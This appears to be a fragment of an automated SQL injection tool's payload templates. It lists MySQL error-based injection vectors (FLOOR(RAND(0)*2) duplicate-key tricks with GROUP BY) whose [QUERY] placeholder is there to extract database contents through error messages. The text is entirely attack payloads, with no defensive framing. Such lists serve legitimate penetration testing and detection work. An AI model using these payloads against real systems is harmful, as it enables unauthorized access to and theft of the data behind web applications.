test.vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
test.vector: AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)

test.vector: OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
